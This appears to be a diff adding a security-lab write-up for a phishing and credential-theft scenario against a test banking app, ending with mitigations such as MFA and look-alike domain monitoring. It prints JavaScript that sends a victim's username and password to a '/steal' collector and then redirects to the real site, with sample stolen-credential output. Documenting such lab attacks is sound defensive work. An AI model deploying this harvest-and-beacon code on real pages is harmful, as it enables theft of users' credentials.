@@ -1,0 +1,22 @@
+=== A6 Phishing / credential theft — VULNERABLE ===
+# lab artifact (attacks/A6/phishing-login.html)
+
+The typosquatted page harvests the submitted credentials and beacons them to the attacker
+collector, then forwards to the real site. On submit it runs:
+
+    creds = { username, password }
+    new Image().src = 'http://localhost:9099/steal?t=' + encodeURIComponent(JSON.stringify(creds))
+    window.location = 'https://ebank.local/'      // victim is bounced to the real site
+
+In a normal browser the collector prints, e.g.:
+
+    [!] STOLEN TOKEN received: {"username":"victim.user","password":"Hunter2!"}
+
+NOTE: the exfil path is identical to A3, whose injection + JS execution are verified in
+attacks/A3/evidence.txt; the in-app browser pane sandboxes the cross-port beacon, so it was
+not captured live here. The harvest-and-forward logic is visible in phishing-login.html.
+
+=== Mitigation (not a code patch — see README) ===
+MFA (TOTP) defeats replay of a captured password; Keycloak brute-force protection; external/
+unknown-origin banners + user education; DNS monitoring for look-alike domains; short-lived
+tokens with refresh rotation.
